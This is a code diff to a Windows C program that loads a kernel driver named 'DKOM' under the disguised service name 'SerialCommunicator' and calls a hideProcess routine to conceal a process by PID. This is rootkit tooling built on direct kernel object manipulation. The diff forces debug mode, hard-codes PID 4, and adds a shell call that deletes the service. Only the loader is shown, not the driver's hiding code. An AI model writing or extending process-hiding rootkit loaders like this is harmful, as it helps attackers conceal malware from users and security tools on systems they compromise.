@@ -15,7 +15,11 @@ bool cmdLoadSysFile(char* driverName, char* displayName);
 bool tryLoadSysFile(char* driverName, char* displayName);
 bool hideProcess(char* driverName, int pid);
 
-#ifdef _DEBUG
+#if defined _DEBUG || defined TRUE
+#define DEBUG
+#endif
+
+#ifdef DEBUG
 #define TRY_LOAD
 #else // RELEASE
 #define SCM_LOAD
@@ -31,17 +35,22 @@ bool hideProcess(char* driverName, int pid);
 
 int main(int argc, char *argv[])
 {
-	printf("lasterr: %d", GetLastError());
+	printf("lasterr: %d\n", GetLastError());
 	Logs::log = new Log();
 	Logs::log->WriteLine("\n\nstarted...\n");
-	if (argc < 2)
-	{
-		printf("Not enougth arguments");
-		return 0;
-	}
+	//if (argc < 2)
+	//{
+	//	printf("Not enougth arguments");
+	//	return 0;
+	//}
 	char* driverName = "DKOM";
 	char* displayName = "SerialCommunicator"; // friendly name
-	if (loadSysFile(driverName, displayName) && hideProcess(driverName, (int)argv[1])) //(int)argv[1]);)//"friendly driver"))//argv[1]);
+#ifdef DEBUG
+	char buff[200];
+	sprintf(buff, "sc delete %s", driverName);
+	system(buff);
+#endif
+	if (loadSysFile(driverName, displayName) && hideProcess(driverName, 4/*(int)argv[1]*/)) //(int)argv[1]);)//"friendly driver"))//argv[1]);
 		printf("success\n");
 	else
 		printf("failure\n");
